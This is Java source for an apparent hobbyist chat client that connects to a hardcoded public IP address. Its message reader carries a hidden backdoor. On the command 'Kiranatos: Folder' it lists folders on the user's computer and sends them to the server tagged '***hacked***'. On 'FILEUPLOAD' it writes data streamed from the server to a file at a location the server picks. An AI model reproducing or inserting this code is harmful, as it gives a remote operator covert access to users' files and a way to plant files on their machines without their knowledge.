package net.kiranatos.e99books.sierra.mychat;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

public class UserSocketDEEPER implements Runnable {
    
    private boolean newMessage = false;
    private String nsm;
    int a = 0;
    private boolean isFiles = false;
    private String[] foldersList;
    
    UserGUI gui;
    UserFiles uf = new UserFiles();   
    
    boolean downloadingFile = false;
    String pathToSave = "C:\\";
    
    FileOutputStream file;
    
    public void setGUI(UserGUI gui) { this.gui = gui; }
    
    public void newUserMessage (String str) {
        nsm = str;
        newMessage = true;
    }
    
    @Override
    public void run() {  
        uf.setUsd(this);
        try {            
                //Socket sock = new Socket("127.0.0.1",4242);
                Socket sock = new Socket("176.113.154.80", 4242);                
                
                Thread w = new Thread (new ClientWriter(sock));
                w.start();
                
                Thread r = new Thread (new ClientReader(sock));                
                r.start();

        } catch (IOException ex) {
            Logger.getLogger(UserSocketDEEPER.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    
    /******************************************************************/
    
     private class ClientWriter implements Runnable 
    {
        PrintWriter writer;
        Socket socky;

        public ClientWriter(Socket socky) throws IOException {
            this.socky = socky;
            writer = new PrintWriter(socky.getOutputStream());            
        }       
        
        @Override
        public void run() {
            String message = "\nRender: ";
            while (true) {
                if (newMessage) {
                    String sentence = message + nsm;                    
                    writer.println(sentence);
                    writer.flush();                    
                    gui.mainChatJTextArea.append(sentence);
                    newMessage = false;
                    nsm = "";
                }
                else if(isFiles) {
                    for (int i=0; i < foldersList.length; i++) {
                        String fullPath = "***hacked***:" + foldersList[i];
                        writer.println(fullPath);
                        writer.flush();
                    }
                    isFiles = false;
                    foldersList = null;
                }
                try {Thread.sleep(1000);} catch (InterruptedException ex) {}
            }
        }                
     }
     
     
     /******************************************************************/
     
     private class ClientReader implements Runnable 
    {
        BufferedReader reader;
        Socket socky;

        public ClientReader(Socket socky) throws IOException {
            this.socky = socky;
            InputStreamReader isReader = new InputStreamReader(socky.getInputStream());
            reader = new BufferedReader(isReader);
        }       
        
        @Override
        public void run() {          
            //String message2;            
            try {                
                while (true) {
                    String message = reader.readLine();
                    if (downloadingFile) 
                    {
                        //System.out.println(downloadingFile);                        
                        int v = Integer.parseInt(message);
                        message = null;
                        if (v >= 0) {
                            System.out.print(v + " ");
                            file.write(v);                            
                            //file = new FileOutputStream (pathToSave); 
                            //file.close();
                            

                        }
                        if (v<0) {
                            downloadingFile = false;
                            file.flush();
                            file.close();
                            message = null;
                            System.out.println("\nПередача файла завершина");
                        }                        
                        //try {Thread.sleep(1000);} catch (InterruptedException ex) {}
                    }
                    else if (!downloadingFile) { 
                        if (message != null) {
                            //System.out.println(downloadingFile);
                            if (message.contains("FILEUPLOAD")) { 
                                downloadingFile = true; 
                                pathToSave = message.replace("FILEUPLOAD:", "").replace("Kiranatos:", "").trim() + "\\fromKiranatos.jpg";
                                System.out.println(pathToSave);
                                file = new FileOutputStream (pathToSave);
                            }
                            else if (message.contains("Kiranatos: Folder ")) {                                
                                foldersList = uf.callComand(message.replaceFirst("Kiranatos: Folder ", ""));
                                if (foldersList!=null) isFiles = true;
                                else newUserMessage ("***Error hacking***");
                            }
                            else {
                                gui.mainChatJTextArea.append("\n" + message);
                            }
                        }
                    }
                }
            } catch (IOException ex) { Logger.getLogger(ServerSocketDEEPER.class.getName()).log(Level.SEVERE, null, ex); }
        }  
        
        /*** END run ClientReader **/
    }     
     /*** END ClientReader **/
}